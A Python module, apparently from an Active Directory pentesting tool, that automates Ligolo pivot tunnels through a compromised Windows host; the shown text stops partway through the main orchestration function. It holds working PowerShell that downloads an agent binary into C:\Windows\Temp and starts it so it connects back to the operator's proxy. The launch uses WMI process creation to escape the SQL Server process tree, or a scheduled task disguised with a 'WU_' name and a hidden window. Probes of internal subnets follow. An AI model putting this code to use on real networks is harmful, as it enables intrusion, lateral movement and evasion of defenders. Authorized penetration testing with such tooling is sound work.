"""Reusable pivot orchestration helpers.

This module centralizes tunnel-creation logic that should be reusable from
multiple access protocols. Callers provide protocol-specific callbacks for
remote staging/execution while the Ligolo orchestration, UX, persistence, and
post-route verification remain shared.
"""

from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timezone
import hashlib
import json
import secrets
import socket
import threading
import time
from typing import Any, Callable

from rich.markup import escape as rich_escape
from rich.prompt import Prompt
from rich.table import Table

from adscan_core.port_diagnostics import (
    is_tcp_bind_address_available,
    parse_host_port,
)
from adscan_internal import (
    print_info,
    print_info_debug,
    print_info_verbose,
    print_instruction,
    print_operation_header,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.ligolo_manager import get_ligolo_agent_local_path
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.ligolo_artifact_cleanup_service import (
    cleanup_remote_ligolo_artifact,
    confirm_ligolo_artifact_deployment,
)
from adscan_internal.services.http_transfer_service import (
    DEFAULT_HTTP_STAGING_BIND_CANDIDATES,
    HttpStagedFile,
    SingleFileHttpTransferService,
)
from adscan_internal.services.ligolo_service import LigoloProxyService
from adscan_internal.services.pivot_runtime_state_service import (
    reconcile_domain_pivot_runtime_state,
)


@dataclass(slots=True)
class PivotReachableSubnetSummary:
    """Summarize one subnet that became reachable only through a pivot."""

    prefix_hint: str
    hostnames: list[str]
    ips: list[str]
    reachable_ports: list[int]


def _normalize_mssql_json_stdout(stdout: str) -> str:
    """Normalize MSSQL stdout by dropping wrapper noise like ``NULL`` rows."""

    normalized_lines = [
        line.rstrip()
        for line in str(stdout or "").splitlines()
        if line.strip() and line.strip().upper() != "NULL"
    ]
    return "\n".join(normalized_lines).strip()


def _load_remote_json_stdout(stdout: str, *, mssql_compatible: bool = False) -> Any:
    """Decode JSON stdout, tolerating MSSQL row splitting when requested."""

    normalized = (
        _normalize_mssql_json_stdout(stdout) if mssql_compatible else str(stdout or "").strip()
    )
    if not normalized:
        return {}
    if not mssql_compatible:
        return json.loads(normalized)
    lines = normalized.splitlines()
    for candidate in reversed(lines):
        stripped = candidate.strip()
        if stripped.startswith("{") or stripped.startswith("["):
            try:
                return json.loads(stripped)
            except json.JSONDecodeError:
                break
    concatenated = "".join(line.rstrip() for line in lines)
    if concatenated.startswith("{") or concatenated.startswith("["):
        return json.loads(concatenated)
    return json.loads(normalized)


def summarize_confirmed_pivot_subnets(
    entries: list[dict[str, Any]],
) -> list[PivotReachableSubnetSummary]:
    """Group confirmed pivot targets by prefix hint for UX and tunnel setup."""

    grouped: dict[str, dict[str, Any]] = {}
    for entry in entries:
        if not isinstance(entry, dict):
            continue
        prefix_hint = str(entry.get("prefix_hint") or "").strip()
        if not prefix_hint:
            ip_value = str(entry.get("ip") or "").strip()
            if ip_value:
                prefix_hint = f"{ip_value}/32"
        if not prefix_hint:
            continue
        bucket = grouped.setdefault(
            prefix_hint,
            {"hostnames": set(), "ips": [], "reachable_ports": set()},
        )
        ip_value = str(entry.get("ip") or "").strip()
        if ip_value and ip_value not in bucket["ips"]:
            bucket["ips"].append(ip_value)
        for hostname in entry.get("hostname_candidates", []):
            hostname_text = str(hostname or "").strip()
            if hostname_text:
                bucket["hostnames"].add(hostname_text)
        for port in entry.get("reachable_ports", []):
            if str(port).isdigit():
                bucket["reachable_ports"].add(int(port))

    summaries = [
        PivotReachableSubnetSummary(
            prefix_hint=prefix_hint,
            hostnames=sorted(bucket["hostnames"], key=str.lower),
            ips=list(bucket["ips"]),
            reachable_ports=sorted(bucket["reachable_ports"]),
        )
        for prefix_hint, bucket in grouped.items()
    ]
    return sorted(summaries, key=lambda item: item.prefix_hint)


def _build_ligolo_interface_name(*, domain: str, pivot_host: str) -> str:
    """Build one deterministic short TUN interface name for a pivot host."""

    digest = hashlib.sha1(f"{domain}|{pivot_host}".encode("utf-8")).hexdigest()[:10]
    return f"lg{digest}"[:15]


def _resolve_ligolo_connect_host(shell: Any, *, listen_addr: str) -> str:
    """Resolve the host/IP that remote agents should use to reach the local proxy."""

    host_part, _separator, _port_text = str(listen_addr or "").strip().rpartition(":")
    normalized_host = host_part.strip()
    if normalized_host and normalized_host not in {"0.0.0.0", "*", "::"}:
        if normalized_host.startswith("[") and normalized_host.endswith("]"):
            return normalized_host[1:-1]
        return normalized_host

    from adscan_internal.services.myip_staleness import check_and_refresh_myip

    myip = check_and_refresh_myip(shell, context="Ligolo pivot")
    if myip:
        return myip
    raise RuntimeError(
        "Cannot determine the Ligolo proxy connect IP. Configure the ADscan 'myip' variable first."
    )


def _is_default_http_staging_port_conflict(error: Exception) -> bool:
    """Return whether one exception represents the default HTTP staging port path."""

    return "No default HTTP staging port is available" in str(error or "")


def _prompt_http_staging_recovery_action() -> str:
    """Prompt for the next action when HTTP staging ports are unavailable."""

    return str(
        Prompt.ask(
            "HTTP staging recovery action",
            choices=["retry", "custom", "skip"],
            default="retry",
        )
        or "retry"
    ).strip().lower()


def _resolve_http_staging_bind_addr_with_recovery(
    *,
    pivot_host: str,
    excluded_bind_addrs: list[str] | None = None,
) -> str | None:
    """Resolve one HTTP staging bind address and recover from local port conflicts."""

    excluded = [str(item).strip() for item in (excluded_bind_addrs or []) if str(item).strip()]
    while True:
        try:
            return SingleFileHttpTransferService.resolve_default_bind_addr(
                candidates=DEFAULT_HTTP_STAGING_BIND_CANDIDATES,
                excluded_bind_addrs=excluded,
            )
        except Exception as exc:  # noqa: BLE001
            if not _is_default_http_staging_port_conflict(exc):
                raise
            print_warning(
                f"HTTP staging ports are unavailable for {mark_sensitive(pivot_host, 'hostname')}: "
                f"{rich_escape(str(exc))}"
            )
            if excluded:
                print_instruction(
                    "ADscan excluded local listeners already in use by the current workflow, for example the Ligolo proxy."
                )
            print_instruction("Free one local HTTP port and choose 'retry' to continue here.")
            print_instruction(
                "If the pivot can only egress to another port by design, choose 'custom' and provide it explicitly."
            )
            action = _prompt_http_staging_recovery_action()
            if action == "skip":
                print_info("Skipping HTTP staging for now.")
                return None
            if action == "retry":
                print_info("Retrying HTTP staging port selection.")
                continue
            while True:
                custom_addr = str(
                    Prompt.ask(
                        "Enter the HTTP staging bind address",
                        default="0.0.0.0:8443",
                    )
                    or ""
                ).strip()
                try:
                    parse_host_port(custom_addr)
                except Exception:
                    print_warning("Invalid bind address format. Use host:port, for example 0.0.0.0:8443.")
                    continue
                if custom_addr in excluded:
                    print_warning(
                        f"Custom HTTP staging address {mark_sensitive(custom_addr, 'host')} "
                        "conflicts with an existing excluded listener."
                    )
                    continue
                if not is_tcp_bind_address_available(custom_addr):
                    print_warning(
                        f"Custom HTTP staging address {mark_sensitive(custom_addr, 'host')} is still busy."
                    )
                    continue
                print_info(
                    f"Using custom HTTP staging address {mark_sensitive(custom_addr, 'host')} by operator choice."
                )
                return custom_addr


def _build_windows_transport_preflight_script(
    *,
    proxy_host: str,
    proxy_port: int,
    http_host: str,
    http_port: int,
) -> str:
    """Build one PowerShell script that probes both proxy and HTTP staging reachability."""

    return (
        "function Test-AdscanTcpReachability {\n"
        "    param(\n"
        "        [string]$TargetHost,\n"
        "        [int]$TargetPort\n"
        "    )\n"
        "    $reachable = $false\n"
        "    $client = New-Object System.Net.Sockets.TcpClient\n"
        "    try {\n"
        "        $iar = $client.BeginConnect($TargetHost, $TargetPort, $null, $null)\n"
        "        if ($iar.AsyncWaitHandle.WaitOne(3000, $false)) {\n"
        "            $client.EndConnect($iar) | Out-Null\n"
        "            $reachable = $true\n"
        "        }\n"
        "    } catch {\n"
        "    } finally {\n"
        "        $client.Close()\n"
        "    }\n"
        "    return [PSCustomObject]@{ host = $TargetHost; port = $TargetPort; reachable = $reachable }\n"
        "}\n"
        f"$proxyCheck = Test-AdscanTcpReachability -TargetHost '{proxy_host}' -TargetPort {proxy_port}\n"
        f"$httpCheck = Test-AdscanTcpReachability -TargetHost '{http_host}' -TargetPort {http_port}\n"
        "[PSCustomObject]@{\n"
        "    proxy = $proxyCheck\n"
        "    http = $httpCheck\n"
        "} | ConvertTo-Json -Depth 4 -Compress\n"
    )


def _build_windows_http_download_script(
    *,
    source_url: str,
    remote_path: str,
) -> str:
    """Build one Windows PowerShell script that downloads one artifact over HTTP."""

    return (
        f"$sourceUrl = '{source_url}'\n"
        f"$destinationPath = '{remote_path}'\n"
        "$downloaded = $false\n"
        "$downloadMethod = ''\n"
        "$errors = @()\n"
        "$ProgressPreference = 'SilentlyContinue'\n"
        "try {\n"
        "    Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath -UseBasicParsing\n"
        "    if (Test-Path -LiteralPath $destinationPath) {\n"
        "        $downloaded = $true\n"
        "        $downloadMethod = 'invoke-webrequest'\n"
        "    }\n"
        "} catch {\n"
        "    $errors += ('Invoke-WebRequest: ' + $_.Exception.Message)\n"
        "}\n"
        "if (-not $downloaded) {\n"
        "    try {\n"
        "        $client = New-Object System.Net.WebClient\n"
        "        $client.DownloadFile($sourceUrl, $destinationPath)\n"
        "        if (Test-Path -LiteralPath $destinationPath) {\n"
        "            $downloaded = $true\n"
        "            $downloadMethod = 'webclient'\n"
        "        }\n"
        "    } catch {\n"
        "        $errors += ('WebClient: ' + $_.Exception.Message)\n"
        "    } finally {\n"
        "        if ($client) { $client.Dispose() }\n"
        "    }\n"
        "}\n"
        "if (-not $downloaded) {\n"
        "    try {\n"
        "        $curlCommand = Get-Command curl.exe -ErrorAction SilentlyContinue\n"
        "        if (-not $curlCommand) { throw 'curl.exe not available' }\n"
        "        & $curlCommand.Source '-fsSL' '-o' $destinationPath $sourceUrl\n"
        "        if ($LASTEXITCODE -ne 0) { throw ('curl exit code ' + $LASTEXITCODE) }\n"
        "        if (Test-Path -LiteralPath $destinationPath) {\n"
        "            $downloaded = $true\n"
        "            $downloadMethod = 'curl'\n"
        "        }\n"
        "    } catch {\n"
        "        $errors += ('curl.exe: ' + $_.Exception.Message)\n"
        "    }\n"
        "}\n"
        "$size = 0\n"
        "if (Test-Path -LiteralPath $destinationPath) {\n"
        "    $size = (Get-Item -LiteralPath $destinationPath).Length\n"
        "}\n"
        "[PSCustomObject]@{\n"
        "    downloaded = $downloaded\n"
        "    method = $downloadMethod\n"
        "    destination = $destinationPath\n"
        "    size = $size\n"
        "    errors = @($errors)\n"
        "} | ConvertTo-Json -Depth 4 -Compress\n"
    )


def _download_remote_artifact_via_http(
    *,
    execute_remote_script: Callable[..., str],
    domain: str,
    pivot_host: str,
    username: str,
    password: str,
    staging_file: HttpStagedFile,
    remote_path: str,
) -> bool:
    """Download one local artifact to the remote pivot host over HTTP."""

    download_raw = execute_remote_script(
        domain=domain,
        host=pivot_host,
        username=username,
        password=password,
        script=_build_windows_http_download_script(
            source_url=staging_file.url,
            remote_path=remote_path,
        ),
        operation_name="ligolo_http_stage_download",
    )
    download_payload = json.loads(str(download_raw or "").strip() or "{}")
    downloaded = bool(download_payload.get("downloaded"))
    size_value = int(download_payload.get("size") or 0)
    if downloaded and size_value >= staging_file.file_size:
        print_info_debug(
            "[pivot] HTTP artifact staging succeeded "
            f"method={mark_sensitive(str(download_payload.get('method') or 'unknown'), 'text')} "
            f"size={size_value} "
            f"remote_path={mark_sensitive(remote_path, 'path')}"
        )
        return True

    errors = ", ".join(str(item).strip() for item in download_payload.get("errors", []) if str(item).strip())
    print_warning(
        f"HTTP artifact staging to {mark_sensitive(pivot_host, 'hostname')} failed. "
        "ADscan will fall back to the legacy artifact upload path.",
        items=[
            f"URL: {mark_sensitive(staging_file.url, 'url')}",
            f"Reported size: {size_value}",
            errors or "No remote download errors were returned.",
        ],
        panel=True,
    )
    return False


def _run_ligolo_transport_preflight(
    *,
    execute_remote_script: Callable[..., str],
    domain: str,
    pivot_host: str,
    username: str,
    password: str,
    connect_target: str,
    staging_file: HttpStagedFile,
) -> dict[str, Any]:
    """Probe both the Ligolo proxy and the HTTP staging endpoint in one remote execution."""

    proxy_host, _separator, proxy_port_text = str(connect_target or "").rpartition(":")
    _http_host, _separator, http_port_text = str(staging_file.bind_addr or "").rpartition(":")
    return json.loads(
        str(
            execute_remote_script(
                domain=domain,
                host=pivot_host,
                username=username,
                password=password,
                script=_build_windows_transport_preflight_script(
                    proxy_host=proxy_host,
                    proxy_port=int(proxy_port_text),
                    http_host=staging_file.advertised_host,
                    http_port=int(http_port_text),
                ),
                operation_name="ligolo_transport_preflight",
            )
            or ""
        ).strip()
        or "{}"
    )


def build_ligolo_agent_start_script(
    *,
    remote_agent_path: str,
    connect_target: str,
    fingerprint: str,
) -> str:
    """Return one PowerShell script that starts the Ligolo agent in the background.

    This script is used for non-WinRM transports (e.g. MSSQL xp_cmdshell) where a
    keepalive session is not available.  The process must survive after the calling
    PowerShell session terminates.

    Launch strategy (tried in order):
      1. WMI Win32_Process.Create — the WMI provider host (WmiPrvSE.exe) creates the
         new process, making it a child of WmiPrvSE rather than of the calling
         PowerShell/cmd.exe/sqlservr chain.  Because WmiPrvSE is outside the SQL
         Server process tree the agent survives xp_cmdshell session teardown with no
         credentials or elevated rights required.
      2. Scheduled task — fully independent via the Task Scheduler service; survives
         any session close but typically requires local admin or delegated CIM/WMI
         rights to register tasks.
      3. Start-Process — last resort; creates a direct child of PowerShell and may be
         killed if the caller's process tree is torn down, but works in interactive
         sessions and some constrained environments.
    """
    escaped_path = str(remote_agent_path).replace("'", "''")
    escaped_target = str(connect_target).replace("'", "''")
    escaped_fingerprint = str(fingerprint).replace("'", "''")
    return rf"""
$ErrorActionPreference = 'Stop'
$agentPath = '{escaped_path}'
$connectTarget = '{escaped_target}'
$fingerprint = '{escaped_fingerprint}'
if (-not (Test-Path -LiteralPath $agentPath)) {{
    throw "Ligolo agent binary not found at $agentPath"
}}
$parts = $connectTarget -split ':'
$probeHost = $parts[0]
$probePort = [int]$parts[-1]
$tcpClient = New-Object System.Net.Sockets.TcpClient
try {{
    $connectResult = $tcpClient.BeginConnect($probeHost, $probePort, $null, $null)
    $reachable = $connectResult.AsyncWaitHandle.WaitOne(3000, $false)
    if ($reachable -and -not $tcpClient.Client.Connected) {{ $reachable = $false }}
}} catch {{
    $reachable = $false
}} finally {{
    $tcpClient.Close()
}}
if (-not $reachable) {{
    throw "Ligolo proxy at $connectTarget is not reachable from this host (TCP probe failed)"
}}
$agentArgs = "-connect $connectTarget -accept-fingerprint $fingerprint -retry -retry-delay 5 -reconnect-timeout 60"
$agentExeName = [System.IO.Path]::GetFileNameWithoutExtension($agentPath)
$launchMethod = 'wmi'
$procId = $null
$wmiError = $null
$schtaskError = $null

# 1. WMI Win32_Process.Create — spawns via WmiPrvSE.exe, fully outside the calling
#    process tree (and therefore outside the SQL Server process tree when invoked via
#    xp_cmdshell).  No credentials required; works under the SQL service account.
try {{
    $wmiArgs = @{{
        CommandLine      = "`"$agentPath`" $agentArgs"
        CurrentDirectory = 'C:\Windows\Temp'
    }}
    $wmiResult = Invoke-CimMethod -ClassName Win32_Process -Namespace 'root/cimv2' `
        -MethodName Create -Arguments $wmiArgs -ErrorAction Stop
    if ($wmiResult.ReturnValue -eq 0) {{
        $procId = $wmiResult.ProcessId
    }} else {{
        throw "Win32_Process.Create returned error code $($wmiResult.ReturnValue)"
    }}
}} catch {{
    $wmiError = $_.Exception.Message
    # WMI unavailable or insufficient rights — try scheduled task
    $launchMethod = 'schtask'
    try {{
        $taskName = "WU_$(Get-Random -Minimum 10000 -Maximum 99999)"
        $action   = New-ScheduledTaskAction -Execute $agentPath -Argument $agentArgs
        $trigger  = New-ScheduledTaskTrigger -Once -At '2099-01-01 00:00:00'
        $null = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction Stop
        $null = Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        Start-Sleep -Seconds 3
        $proc   = Get-Process -Name $agentExeName -ErrorAction SilentlyContinue | Select-Object -First 1
        $procId = if ($proc) {{ $proc.Id }} else {{ $null }}
        $null = Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }} catch {{
        $schtaskError = $_.Exception.Message
        # Last resort: Start-Process (process may be killed if process tree is torn down)
        $launchMethod = 'start-process'
        $pargs = @('-connect', $connectTarget, '-accept-fingerprint', $fingerprint, '-retry', '-retry-delay', '5', '-reconnect-timeout', '60')
        $sp = Start-Process -FilePath $agentPath -ArgumentList $pargs -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 2
        $sp.Refresh()
        $procId = if (-not $sp.HasExited) {{ $sp.Id }} else {{ $null }}
    }}
}}

$processAlive = $null -ne $procId
[PSCustomObject]@{{
    started         = $true
    pid             = $procId
    command         = "$agentPath $agentArgs"
    probe_reachable = $true
    process_alive   = $processAlive
    exit_code       = $null
    launch_method   = $launchMethod
    wmi_error       = $wmiError
    schtask_error   = $schtaskError
}} | ConvertTo-Json -Depth 4 -Compress
"""


def build_ligolo_agent_keepalive_script(
    *,
    remote_agent_path: str,
    connect_target: str,
    fingerprint: str,
    result_path: str,
) -> str:
    """Return a PowerShell script that launches the agent and keeps the WinRM session alive.

    Non-interactive WinRM sessions run in a Job Object with KILL_ON_JOB_CLOSE.
    When a script returns the session closes, the Job closes, and every child
    process (including Start-Process children) is killed.

    This script works around that by *never returning* while the agent is alive:
    after writing the result JSON to ``result_path`` it polls the agent process
    every 15 seconds.  A Python background thread holds the ``execute_ps`` call
    open, which keeps the PSRP RunspacePool (and its wsmprovhost.exe Job Object)
    alive for the entire duration.  When the agent exits the script returns,
    closes the WinRM session, and cleans up the result file.
    """
    escaped_path = str(remote_agent_path).replace("'", "''")
    escaped_target = str(connect_target).replace("'", "''")
    escaped_fingerprint = str(fingerprint).replace("'", "''")
    escaped_result = str(result_path).replace("'", "''")
    return rf"""
$ErrorActionPreference = 'Stop'
$agentPath = '{escaped_path}'
$connectTarget = '{escaped_target}'
$fingerprint = '{escaped_fingerprint}'
$resultPath = '{escaped_result}'
if (-not (Test-Path -LiteralPath $agentPath)) {{
    throw "Ligolo agent binary not found at $agentPath"
}}
$parts = $connectTarget -split ':'
$probeHost = $parts[0]
$probePort = [int]$parts[-1]
$tcpClient = New-Object System.Net.Sockets.TcpClient
try {{
    $connectResult = $tcpClient.BeginConnect($probeHost, $probePort, $null, $null)
    $reachable = $connectResult.AsyncWaitHandle.WaitOne(3000, $false)
    if ($reachable -and -not $tcpClient.Client.Connected) {{ $reachable = $false }}
}} catch {{
    $reachable = $false
}} finally {{
    $tcpClient.Close()
}}
if (-not $reachable) {{
    throw "Ligolo proxy at $connectTarget is not reachable from this host (TCP probe failed)"
}}
$agentArgs = @('-connect', $connectTarget, '-accept-fingerprint', $fingerprint, '-retry', '-retry-delay', '5', '-reconnect-timeout', '60')
$sp = Start-Process -FilePath $agentPath -ArgumentList $agentArgs -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 2
$sp.Refresh()
$processAlive = -not $sp.HasExited
[PSCustomObject]@{{
    started      = $true
    pid          = if ($processAlive) {{ $sp.Id }} else {{ $null }}
    command      = $agentPath
    probe_reachable = $true
    process_alive   = $processAlive
    exit_code    = if ($sp.HasExited) {{ $sp.ExitCode }} else {{ $null }}
    launch_method   = 'start-process-keepalive'
}} | ConvertTo-Json -Depth 4 -Compress | Set-Content -LiteralPath $resultPath -Encoding UTF8
# Keep this WinRM session alive so the agent (in this session's Job Object)
# is not killed when the script returns.  Poll every 15 s until agent exits
# or 1-hour safety timeout is reached.
$deadline = [DateTime]::UtcNow.AddHours(1)
while ([DateTime]::UtcNow -lt $deadline) {{
    $sp.Refresh()
    if ($sp.HasExited) {{ break }}
    Start-Sleep -Seconds 15
}}
Remove-Item -LiteralPath $resultPath -ErrorAction SilentlyContinue
"""


def _build_result_reader_script(result_path: str) -> str:
    """PowerShell one-liner that returns the keepalive result file content, or '{}'."""
    escaped = str(result_path).replace("'", "''")
    return (
        f"if (Test-Path -LiteralPath '{escaped}') "
        f"{{ Get-Content -LiteralPath '{escaped}' -Raw }} else {{ '{{}}' }}"
    )


def probe_ligolo_routed_targets(entries: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Probe confirmed routes locally after Ligolo route creation."""

    verification_results: list[dict[str, Any]] = []
    for entry in entries[:10]:
        if not isinstance(entry, dict):
            continue
        ip_value = str(entry.get("ip") or "").strip()
        if not ip_value:
            continue
        candidate_ports = [
            int(port)
            for port in entry.get("reachable_ports", [])
            if str(port).isdigit()
        ][:6]
        observed_ports: list[int] = []
        for port in candidate_ports:
            try:
                with socket.create_connection((ip_value, int(port)), timeout=1.2):
                    observed_ports.append(int(port))
            except OSError:
                continue
        verification_results.append(
            {
                "ip": ip_value,
                "hostname_candidates": [
                    str(item).strip()
                    for item in entry.get("hostname_candidates", [])
                    if str(item).strip()
                ],
                "expected_ports": candidate_ports,
                "observed_ports": observed_ports,
                "prefix_hint": str(entry.get("prefix_hint") or "").strip(),
            }
        )
    return verification_results


def _render_subnet_table(shell: Any, summaries: list[PivotReachableSubnetSummary]) -> None:
    """Render one concise subnet summary before tunnel creation."""

    if not summaries or not getattr(shell, "console", None):
        return
    table = Table(title="Ligolo Pivot Subnets", box=None)
    table.add_column("Subnet")
    table.add_column("Reachable Hosts")
    table.add_column("Host Preview")
    table.add_column("Port Preview")
    for item in summaries[:10]:
        table.add_row(
            mark_sensitive(item.prefix_hint, "text"),
            str(len(item.ips)),
            ", ".join(mark_sensitive(host, "hostname") for host in item.hostnames[:4]) or "-",
            ", ".join(str(port) for port in item.reachable_ports[:6]) or "-",
        )
    shell.console.print(table)


def _is_default_ligolo_port_conflict(error: Exception) -> bool:
    """Return whether one exception represents the default Ligolo port conflict path."""

    return "No default ligolo egress port is available" in str(error or "")


def _is_default_ligolo_api_port_conflict(error: Exception) -> bool:
    """Return whether one exception represents the default Ligolo API port path."""

    return "No default Ligolo API port is available" in str(error or "")


def _prompt_ligolo_listen_recovery_action() -> str:
    """Prompt for the next action when Ligolo default egress ports are unavailable."""

    return str(
        Prompt.ask(
            "Ligolo proxy recovery action",
            choices=["retry", "custom", "skip"],
            default="retry",
        )
        or "retry"
    ).strip().lower()


def _resolve_ligolo_listen_addr_with_recovery(
    service: LigoloProxyService, *, pivot_host: str
) -> str | None:
    """Resolve one listen address and recover locally from default port conflicts."""

    while True:
        try:
            return service.resolve_default_listen_addr()
        except Exception as exc:  # noqa: BLE001
            if not _is_default_ligolo_port_conflict(exc):
                raise
            print_warning(
                f"Ligolo default egress ports are unavailable for {mark_sensitive(pivot_host, 'hostname')}: "
                f"{rich_escape(str(exc))}"
            )
            print_instruction("Free 443 or 80 on the base host, then choose 'retry' to continue here.")
            print_instruction(
                "If the pivot host can only egress to another port by design, choose 'custom' and provide it explicitly."
            )
            action = _prompt_ligolo_listen_recovery_action()
            if action == "skip":
                print_info("Skipping Ligolo tunnel creation for now.")
                return None
            if action == "retry":
                print_info("Retrying Ligolo default egress port selection.")
                continue
            while True:
                custom_addr = str(
                    Prompt.ask(
                        "Enter the Ligolo proxy listen address",
                        default="0.0.0.0:8443",
                    )
                    or ""
                ).strip()
                try:
                    parse_host_port(custom_addr)
                except Exception:
                    print_warning("Invalid listen address format. Use host:port, for example 0.0.0.0:8443.")
                    continue
                if not is_tcp_bind_address_available(custom_addr):
                    print_warning(
                        f"Custom Ligolo listen address {mark_sensitive(custom_addr, 'host')} is still busy."
                    )
                    continue
                print_info(
                    f"Using custom Ligolo listen address {mark_sensitive(custom_addr, 'host')} by operator choice."
                )
                return custom_addr


def _prompt_ligolo_api_recovery_action() -> str:
    """Prompt for the next action when Ligolo API ports are unavailable."""

    return str(
        Prompt.ask(
            "Ligolo API recovery action",
            choices=["retry", "custom", "skip"],
            default="retry",
        )
        or "retry"
    ).strip().lower()


def _resolve_ligolo_api_laddr_with_recovery(
    service: LigoloProxyService,
    *,
    pivot_host: str,
    excluded_bind_addrs: list[str] | None = None,
) -> str | None:
    """Resolve one local Ligolo API bind address and recover from port conflicts."""

    excluded = [str(item).strip() for item in (excluded_bind_addrs or []) if str(item).strip()]
    while True:
        try:
            return service.resolve_default_api_laddr(excluded_bind_addrs=excluded)
        except Exception as exc:  # noqa: BLE001
            if not _is_default_ligolo_api_port_conflict(exc):
                raise
            print_warning(
                f"Ligolo API ports are unavailable for {mark_sensitive(pivot_host, 'hostname')}: "
                f"{rich_escape(str(exc))}"
            )
            print_instruction("Free one local loopback API port and choose 'retry' to continue here.")
            print_instruction(
                "If you need another local API port by design, choose 'custom' and provide it explicitly."
            )
            action = _prompt_ligolo_api_recovery_action()
            if action == "skip":
                print_info("Skipping Ligolo tunnel creation for now.")
                return None
            if action == "retry":
                print_info("Retrying Ligolo API port selection.")
                continue
            while True:
                custom_addr = str(
                    Prompt.ask(
                        "Enter the Ligolo API bind address",
                        default="127.0.0.1:11611",
                    )
                    or ""
                ).strip()
                try:
                    host, _port = parse_host_port(custom_addr)
                except Exception:
                    print_warning(
                        "Invalid API bind address format. Use host:port, for example 127.0.0.1:11611."
                    )
                    continue
                if host not in {"127.0.0.1", "localhost"}:
                    print_warning("Ligolo API bind address must stay on loopback, for example 127.0.0.1:11611.")
                    continue
                if custom_addr in excluded:
                    print_warning(
                        f"Custom Ligolo API address {mark_sensitive(custom_addr, 'host')} "
                        "conflicts with an existing excluded listener."
                    )
                    continue
                if not is_tcp_bind_address_available(custom_addr):
                    print_warning(
                        f"Custom Ligolo API address {mark_sensitive(custom_addr, 'host')} is still busy."
                    )
                    continue
                print_info(
                    f"Using custom Ligolo API address {mark_sensitive(custom_addr, 'host')} by operator choice."
                )
                return custom_addr


def _keepalive_exit_was_operator_requested(
    service: LigoloProxyService,
    *,
    tunnel_id: str | None,
) -> bool:
    """Return whether the keepalive exit belongs to an intentional shutdown path."""

    if not tunnel_id:
        return False
    try:
        record = service.get_tunnel_record(tunnel_id)
    except Exception as exc:  # noqa: BLE001
        print_info_debug(f"[ligolo-cleanup] failed to inspect tunnel shutdown state: {exc}")
        return False
    if not isinstance(record, dict):
        return False
    if bool(record.get("shutdown_requested")):
        return True
    cleanup_reason = str(record.get("remote_artifact_cleanup_reason") or "").strip().lower()
    return cleanup_reason == "adscan_exit"


def orchestrate_ligolo_pivot_tunnel(
    shell: Any,
    *,
    domain: str,
    pivot_host: str,
    username: str,
    password: str,
    confirmed_targets: list[dict[str, Any]],
    detect_remote_architecture: Callable[..., str],
    upload_agent: Callable[..., bool],
    execute_remote_script: Callable[..., str],
    remote_agent_os: str = "windows",
    source_service: str = "winrm",
    pivot_method: str = "ligolo_winrm_pivot",
) -> bool:
    """Create one Ligolo tunnel for confirmed pivot subnets and verify the routes."""

    workspace_dir = str(getattr(shell, "current_workspace_dir", "") or "").strip()
    if not workspace_dir:
        print_info_debug(
            "Skipping Ligolo pivot tunnel automation: no active workspace is loaded."
        )
        return False

    subnet_summaries = summarize_confirmed_pivot_subnets(confirmed_targets)
    if not subnet_summaries:
        print_info_debug(
            "Skipping Ligolo pivot tunnel automation: no subnet summaries were derived from confirmed targets."
        )
        return False

    _render_subnet_table(shell, subnet_summaries)
    print_info(
        f"{len(subnet_summaries)} subnet(s) behind {mark_sensitive(pivot_host, 'hostname')} appear suitable for a Ligolo tunnel. "
        "This will route the selected prefixes through the pivot so existing ADscan tooling can reach those hosts directly."
    )
    default_confirm = str(getattr(shell, "type", "") or "").strip().lower() == "ctf"

    try:
        service = LigoloProxyService(workspace_dir=workspace_dir, current_domain=domain)
        remote_agent_path = ""
        remote_agent_pid: int | None = None
        persisted_tunnel_id: str | None = None

        def _persist_artifact_cleanup_update(updates: dict[str, Any]) -> None:
            updater = getattr(service, "update_tunnel_record", None)
            if not persisted_tunnel_id or not callable(updater):
                return
            updater(tunnel_id=persisted_tunnel_id, updates=updates)

        proxy_state = service.get_status()
        if not bool(proxy_state.get("alive")):
            listen_addr = _resolve_ligolo_listen_addr_with_recovery(
                service,
                pivot_host=pivot_host,
            )
            if not listen_addr:
                return
            api_laddr = _resolve_ligolo_api_laddr_with_recovery(
                service,
                pivot_host=pivot_host,
            )
            if not api_laddr:
                return
            print_operation_header(
                "Ligolo Pivot Tunnel",
                details={
                    "Domain": domain,
                    "Pivot Host": pivot_host,
                    "Listen": listen_addr,
                    "API": api_laddr,
                    "Subnets": str(len(subnet_summaries)),
                    "Host Count": str(len(confirmed_targets)),
                },
                icon="🧭",
            )
            proxy_state = service.start_proxy(listen_addr=listen_addr, api_laddr=api_laddr)
        else:
            print_operation_header(
                "Ligolo Pivot Tunnel",
                details={
                    "Domain": domain,
                    "Pivot Host": pivot_host,
                    "Listen": proxy_state.get("listen_addr") or "unknown",
                    "API": proxy_state.get("api_laddr") or "unknown",
                    "Subnets": str(len(subnet_summaries)),
                    "Host Count": str(len(confirmed_targets)),
                },
                icon="🧭",
            )

        service.wait_for_api_ready()
        connect_host = _resolve_ligolo_connect_host(
            shell, listen_addr=str(proxy_state.get("listen_addr") or "")
        )
        connect_target = (
            f"{connect_host}:{str(proxy_state.get('listen_addr') or '').rpartition(':')[2]}"
        )
        fingerprint = service.get_server_fingerprint()

        architecture = detect_remote_architecture(
            domain=domain,
            host=pivot_host,
            username=username,
            password=password,
        )
        agent_path = get_ligolo_agent_local_path(
            target_os=remote_agent_os, arch=architecture
        )
        if agent_path is None:
            raise RuntimeError(
                f"Ligolo {remote_agent_os} agent is not available for architecture {architecture}. "
                "Ensure the pinned asset is present in the runtime cache."
            )

        extension = ".exe" if str(remote_agent_os).lower() == "windows" else ""
        remote_agent_name = (
            f"adscan_ligolo_{hashlib.sha1(pivot_host.encode('utf-8')).hexdigest()[:8]}_{int(time.time())}{extension}"
        )
        remote_agent_path = (
            rf"C:\Windows\Temp\{remote_agent_name}"
            if str(remote_agent_os).lower() == "windows"
            else f"/tmp/{remote_agent_name}"
        )
        if not confirm_ligolo_artifact_deployment(
            pivot_host=pivot_host,
